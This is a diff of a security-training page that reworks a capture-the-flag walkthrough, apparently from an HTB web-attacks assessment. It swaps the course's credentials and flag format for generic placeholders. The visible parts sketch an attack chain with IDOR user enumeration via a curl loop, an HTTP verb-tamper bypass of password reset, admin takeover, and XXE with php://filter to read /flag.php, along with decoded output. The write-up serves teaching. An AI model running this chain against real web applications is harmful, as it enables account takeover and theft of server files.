@@ -1,22 +1,22 @@
 ---
-title: Skill assessment chain
-description: The capstone end-to-end walkthrough - login as a low-privilege user, IDOR to enumerate accounts and discover the admin uid and password-reset token, verb-tamper a POST reset endpoint into a GET to bypass session check, log in as admin, reach an admin-only events feature with an XML endpoint, and XXE the flag out of /flag.php via php://filter base64 encoding. Every primitive from this round chained into one engagement.
+title: Capstone chain
+description: The capstone end-to-end walkthrough - login as a low-privilege user, IDOR to enumerate accounts and discover the admin uid and password-reset token, verb-tamper a POST reset endpoint into a GET to bypass session check, log in as admin, reach an admin-only events feature with an XML endpoint, and XXE the flag out of /flag.php via php://filter base64 encoding. Every primitive in this cluster chained into one engagement.
 mitre: [T1190, T1212, T1556, T1213, T1083]
 d3fend: [D3-IAA]
 impact: [DataExfil, AccountTakeover, PrivEsc]
 owasp: [A01, A05]
 sidebar:
   order: 7
-  label: Skill assessment chain
+  label: Capstone chain
 ---
 
 ## TL;DR
 
-A canonical engagement chain combining all three Round 13 primitives. Five stages: login → IDOR enumeration to find admin uid and reset-token API → verb-tamper a POST reset into a GET to bypass session-binding → log in as the now-reset admin → use admin-only event-creation endpoint with XXE to read `/flag.php`.
+A canonical engagement chain combining all three of this cluster's primitives. Five stages: login → IDOR enumeration to find admin uid and reset-token API → verb-tamper a POST reset into a GET to bypass session-binding → log in as the now-reset admin → use admin-only event-creation endpoint with XXE to read `/flag.php`.
 
 ```
 # Stage 1 - Login as low-privilege user
-htb-student / Academy_student!     → uid=74
+student / P@ssw0rd!     → uid=74
 
 # Stage 2 - IDOR enumeration via /api.php
 for uid in {1..100}; do curl '/api.php?uid=$uid'; done
@@ -37,13 +37,13 @@ POST /addEvent.php with crafted XML containing XXE
 → base64 in response; decode for the flag
 ```
 
-Success indicator: `HTB{...}` flag value decoded from the base64-encoded `/flag.php` source code returned in the XXE response.
+Success indicator: `FLAG{...}` flag value decoded from the base64-encoded `/flag.php` source code returned in the XXE response.
 
 ## Scenario
 
-A bug bounty engagement on a social-networking web app. Provided credentials: `htb-student` / `Academy_student!`. Goal: read `/flag.php`. The web app has multiple defenses but none individually is tight - chaining the gaps yields full compromise.
+A bug bounty engagement on a social-networking web app. Provided credentials: `student` / `P@ssw0rd!`. Goal: read `/flag.php`. The web app has multiple defenses but none individually is tight - chaining the gaps yields full compromise.
 
-This walkthrough is the HTB Web Attacks module skill assessment, presented in the way the operator should approach a real engagement: one primitive at a time, verifying each step's effect, escalating until the chain completes.
+This is a representative end-to-end chain, presented in the way the operator should approach a real engagement: one primitive at a time, verifying each step's effect, escalating until the chain completes.
 
 ## Stage 1 - Authenticate and map the surface
 
@@ -75,7 +75,7 @@ The page makes `GET /api.php?uid=<n>` to populate user details. Test if it's IDO
 $ curl -sb 'PHPSESSID=mine' 'http://target/api.php?uid=74' | jq
 {
   "uid": "74",
-  "username": "htb-student",
+  "username": "student",
   "email": "student@...",
   "role": "Standard",
   "token": "..."
@@ -301,7 +301,7 @@ The `name` field contains the base64-encoded source of `/flag.php`. Decode:
 ```shell
 $ echo 'PD9waHAKJGZsYWcgPSAnSFRCe...K' | base64 -d
 <?php
-$flag = 'HTB{actual_flag_value_here}';
+$flag = 'FLAG{actual_flag_value_here}';
 ?>
 ```
 
